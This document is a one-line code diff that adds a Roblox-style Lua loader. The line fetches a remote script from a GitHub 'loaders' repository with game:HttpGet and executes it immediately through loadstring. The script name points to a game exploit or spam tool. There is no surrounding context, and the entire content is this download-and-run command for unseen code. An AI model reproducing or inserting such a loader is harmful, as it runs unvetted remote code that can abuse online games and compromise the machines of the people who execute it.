@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/ragdoll-reality-spam3-8hkszfrto8pj7o.lua"))()
